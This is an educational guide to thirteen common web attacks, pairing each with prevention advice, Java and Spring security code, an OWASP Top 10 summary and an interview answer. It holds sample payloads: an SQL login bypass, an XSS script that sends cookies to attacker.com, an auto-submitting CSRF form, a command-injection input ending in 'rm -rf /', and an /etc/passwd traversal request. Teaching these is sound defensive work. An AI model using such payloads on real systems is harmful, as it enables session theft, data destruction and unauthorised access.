# Major Types of Web Attacks

A comprehensive guide to understanding common web security vulnerabilities and their prevention methods.

---

## Table of Contents

1. [SQL Injection (SQLi)](#1-sql-injection-sqli)
2. [Authentication Attacks](#2-authentication-attacks)
3. [Broken Access Control](#3-broken-access-control)
4. [Man-in-the-Middle (MITM)](#4-man-in-the-middle-mitm)
5. [Cross-Site Request Forgery (CSRF)](#5-cross-site-request-forgery-csrf)
6. [Cross-Site Scripting (XSS)](#6-cross-site-scripting-xss)
7. [Command Injection](#7-command-injection)
8. [File Upload Attacks](#8-file-upload-attacks)
9. [Directory Traversal](#9-directory-traversal)
10. [Denial of Service (DoS/DDoS)](#10-denial-of-service-dosddos)
11. [Clickjacking](#11-clickjacking)
12. [Insecure Deserialization](#12-insecure-deserialization)
13. [Security Misconfiguration](#13-security-misconfiguration)
14. [OWASP Top 10](#owasp-top-10)

---

## 1. SQL Injection (SQLi)

### What it is
An attack where malicious SQL commands are injected through input fields to access or modify the database.

### Example Attack

**Normal login query:**
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '1234';
```

**Attacker enters in username field:**
```
' OR '1'='1
```

**Resulting query:**
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '1234';
```

**Result:** Login bypassed because `'1'='1'` is always true.

### Prevention
- Use prepared statements (parameterized queries)
- Use ORM frameworks (JPA/Hibernate)
- Validate and sanitize all user inputs
- Implement least privilege database access

**Secure Code Example (Java):**
```java
// VULNERABLE CODE
String query = "SELECT * FROM users WHERE username = '" + username + "'";

// SECURE CODE
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);
```

---

## 2. Authentication Attacks

### a) Brute Force Attack

**What it is:** Attacker tries thousands of password combinations until finding the correct one.

**Example:**
```
Attempt 1: password
Attempt 2: 123456
Attempt 3: admin
Attempt 4: qwerty
... (continues until success)
```

**Prevention:**
- Implement rate limiting
- Account lockout after failed attempts
- Use CAPTCHA after multiple failures
- Monitor and log authentication attempts

### b) Credential Stuffing

**What it is:** Attacker uses leaked username/password combinations from other breached websites.

**Example:**
- LinkedIn breach exposed: `john@email.com:password123`
- Attacker tries same credentials on banking sites

**Prevention:**
- Enforce strong password policies
- Implement two-factor authentication (2FA)
- Use password breach detection services
- Educate users about unique passwords

---

## 3. Broken Access Control

### What it is
Users can access resources or perform actions they shouldn't be authorized to do.

### Example Attack

**Normal user requests:**
```
GET /api/user/profile
```

**Attacker modifies URL to:**
```
GET /api/admin/users
```

**If backend doesn't verify roles:** Attacker gains unauthorized access to admin data.

### Prevention
- Implement role-based access control (RBAC)
- Always verify permissions on the backend
- Never rely on frontend-only authorization
- Use principle of least privilege
- Default deny access

**Secure Code Example (Spring Security):**
```java
@GetMapping("/admin/users")
@PreAuthorize("hasRole('ADMIN')")
public List<User> getAllUsers() {
    return userService.findAll();
}
```

---

## 4. Man-in-the-Middle (MITM)

### What it is
Attacker intercepts communication between client and server to steal or modify data.

### Example Attack

**Scenario:** User connects to public Wi-Fi at a coffee shop
1. User enters login credentials
2. Attacker intercepts unencrypted HTTP traffic
3. Attacker captures username and password
4. Attacker uses stolen credentials

### Prevention
- Use HTTPS everywhere (TLS/SSL certificates)
- Implement HTTP Strict Transport Security (HSTS)
- Use certificate pinning for mobile apps
- Avoid using public Wi-Fi for sensitive transactions

**Configuration Example (Spring Boot):**
```properties
server.ssl.enabled=true
server.ssl.key-store=classpath:keystore.p12
server.ssl.key-store-password=your-password
```

---

## 5. Cross-Site Request Forgery (CSRF)

### What it is
Attacker tricks a logged-in user into executing unwanted actions on a web application.

### Example Attack

**Malicious website contains:**
```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to" value="attacker-account">
</form>
<script>document.forms[0].submit();</script>
```

When a logged-in user visits this page, money is transferred without their knowledge.

### Prevention
- Use CSRF tokens
- Use JWT for stateless APIs
- Implement SameSite cookie attribute
- Verify Origin and Referer headers

**Spring Security CSRF Protection:**
```java
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
        return http.build();
    }
}
```

---

## 6. Cross-Site Scripting (XSS)

### What it is
Attacker injects malicious scripts into web pages viewed by other users.

### Example Attack

**User posts a comment:**
```html
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**When other users view the comment:** Their session cookies are sent to the attacker.

### Prevention
- Sanitize all user inputs
- Escape output data
- Use Content Security Policy (CSP) headers
- Use frameworks that auto-escape (React, Angular)

**Secure Code Example:**
```java
// VULNERABLE CODE
response.getWriter().write("Hello " + username);

// SECURE CODE
response.getWriter().write("Hello " + StringEscapeUtils.escapeHtml4(username));
```

---

## 7. Command Injection

### What it is
Attacker executes arbitrary operating system commands on the server.

### Example Attack

**Vulnerable backend code:**
```java
Runtime.getRuntime().exec("ping " + userInput);
```

**Attacker input:**
```
google.com && rm -rf /
```

**Resulting command:**
```bash
ping google.com && rm -rf /
```

**Result:** Server files deleted.

### Prevention
- Never execute user input directly
- Use parameterized APIs
- Implement input validation with whitelisting
- Use least privilege for application processes

**Secure Alternative:**
```java
// Use ProcessBuilder with separate arguments
ProcessBuilder pb = new ProcessBuilder("ping", userInput);
Process process = pb.start();
```

---

## 8. File Upload Attacks

### What it is
Attacker uploads malicious files (scripts, executables) disguised as legitimate files.

### Example Attack

**Attacker uploads:**
- File name: `innocent-image.jpg`
- Actual content: `shell.jsp` (web shell script)

**If executed:** Attacker gains remote code execution.

### Prevention
- Validate file types (check magic bytes, not just extension)
- Limit file size
- Store files outside web root
- Use virus scanning
- Rename uploaded files
- Set proper file permissions

**Secure Code Example:**
```java
public boolean isValidImage(MultipartFile file) {
    String contentType = file.getContentType();
    return contentType != null && 
           (contentType.equals("image/jpeg") || 
            contentType.equals("image/png"));
}
```

---

## 9. Directory Traversal

### What it is
Attacker accesses files and directories outside the intended directory.

### Example Attack

**Normal request:**
```
GET /files?name=report.pdf
```

**Malicious request:**
```
GET /files?name=../../etc/passwd
```

**Result:** Attacker reads system password file.

### Prevention
- Normalize and validate file paths
- Use whitelist of allowed files
- Implement proper access controls
- Use absolute paths internally
- Reject paths with `..` sequences

**Secure Code Example:**
```java
public File getFile(String filename) {
    File file = new File(BASE_DIR, filename);
    if (!file.getCanonicalPath().startsWith(BASE_DIR)) {
        throw new SecurityException("Invalid file path");
    }
    return file;
}
```

---

## 10. Denial of Service (DoS/DDoS)

### What it is
Attacker overwhelms a server with traffic, making it unavailable to legitimate users.

### Example Attack

**Single source (DoS):**
- One attacker sends millions of requests per second

**Distributed (DDoS):**
- Thousands of compromised computers (botnet) flood the server

### Prevention
- Implement rate limiting
- Use API gateways
- Deploy CDN and load balancers
- Use cloud-based DDoS protection
- Implement CAPTCHA for suspicious traffic
- Monitor traffic patterns

**Rate Limiting Example (Spring Boot):**
```java
@Component
public class RateLimitingFilter extends OncePerRequestFilter {
    private final Map<String, Integer> requestCounts = new ConcurrentHashMap<>();
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                    HttpServletResponse response, 
                                    FilterChain filterChain) {
        String clientIP = request.getRemoteAddr();
        int count = requestCounts.getOrDefault(clientIP, 0);
        
        if (count > 100) { // 100 requests per minute
            response.setStatus(429); // Too Many Requests
            return;
        }
        
        requestCounts.put(clientIP, count + 1);
        filterChain.doFilter(request, response);
    }
}
```

---

## 11. Clickjacking

### What it is
Attacker tricks users into clicking on something different from what they perceive.

### Example Attack

**Malicious page contains:**
```html
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute;"></iframe>
<button style="position:absolute;">Click for Free Prize!</button>
```

**Result:** User thinks they're clicking for a prize but actually approves a bank transfer.

### Prevention
- Set `X-Frame-Options` header
- Use Content Security Policy (CSP)
- Implement frame-busting JavaScript

**Spring Security Configuration:**
```java
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        http.headers().frameOptions().deny();
        return http.build();
    }
}
```

---

## 12. Insecure Deserialization

### What it is
Attacker sends malicious serialized objects that execute harmful code when deserialized.

### Example Attack

**Attacker sends crafted serialized object containing:**
```java
// Malicious payload that executes system commands
Runtime.getRuntime().exec("malicious-command");
```

**When application deserializes:** Arbitrary code executes on the server.

### Prevention
- Avoid Java native serialization
- Use safe formats (JSON, XML with validation)
- Implement input validation
- Use allowlists for deserializable classes
- Monitor deserialization activities

**Secure Alternative:**
```java
// Instead of Java serialization, use JSON
ObjectMapper mapper = new ObjectMapper();
User user = mapper.readValue(jsonString, User.class);
```

---

## 13. Security Misconfiguration

### What it is
Insecure default configurations, incomplete setups, or verbose error messages.

### Common Examples

- Default passwords unchanged (admin/admin)
- Debug mode enabled in production
- Directory listing enabled
- Unnecessary ports open
- Outdated software components
- Detailed error messages exposing system info

### Prevention
- Use secure defaults
- Remove unnecessary features
- Keep software updated
- Use environment-specific configurations
- Implement security headers
- Regular security audits

**Spring Boot Production Configuration:**
```properties
# Disable detailed error messages
server.error.include-stacktrace=never
server.error.include-message=never

# Disable actuator endpoints in production
management.endpoints.web.exposure.include=health,info

# Enable security headers
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.secure=true
```

---

## OWASP Top 10

The Open Web Application Security Project (OWASP) maintains a list of the most critical web application security risks:

1. **Broken Access Control** - Users can act outside their permissions
2. **Cryptographic Failures** - Sensitive data exposed due to weak encryption
3. **Injection** - SQL, OS, LDAP injection vulnerabilities
4. **Insecure Design** - Missing security controls in design phase
5. **Security Misconfiguration** - Incorrect security settings
6. **Vulnerable and Outdated Components** - Using libraries with known vulnerabilities
7. **Authentication Failures** - Weak authentication mechanisms
8. **Software and Data Integrity Failures** - Code/data without integrity verification
9. **Security Logging and Monitoring Failures** - Insufficient logging and monitoring
10. **Server-Side Request Forgery (SSRF)** - Application fetches remote resources without validation

---

## Quick Interview Answer

**Question:** "What are common web attacks and how do you prevent them?"

**Answer:** 

"Common web attacks include SQL injection, XSS, CSRF, broken access control, authentication attacks, and DoS. These are primarily prevented through:

- Input validation and sanitization
- Proper authentication and authorization
- Using HTTPS and secure communication
- Implementing security headers
- Following secure coding practices
- Regular security testing and updates
- Configuration management"

---

## How Spring Security Helps

A properly configured Spring Security setup protects against many common attacks:

| Security Feature | Prevents Attack Type |
|-----------------|---------------------|
| JWT Authentication | CSRF (stateless tokens) |
| Role-based Access Control | Broken Access Control |
| BCrypt Password Encoding | Password Theft/Rainbow Tables |
| HTTPS Enforcement | Man-in-the-Middle |
| CORS Configuration | Unauthorized Cross-Origin Requests |
| Security Headers | XSS, Clickjacking |
| Rate Limiting | Brute Force, DoS |
| Input Validation | Injection Attacks |

---

## Best Practices Summary

1. **Never trust user input** - Always validate and sanitize
2. **Use prepared statements** - Prevent SQL injection
3. **Implement proper authentication** - Strong passwords, 2FA, rate limiting
4. **Enforce authorization checks** - Verify on backend, not frontend
5. **Use HTTPS everywhere** - Encrypt data in transit
6. **Keep dependencies updated** - Patch known vulnerabilities
7. **Follow principle of least privilege** - Minimum necessary permissions
8. **Implement security logging** - Monitor and detect attacks
9. **Use security headers** - Defense in depth
10. **Regular security audits** - Continuous improvement

---

**Remember:** Security is not a one-time implementation but an ongoing process. Stay updated with latest security practices and vulnerabilities.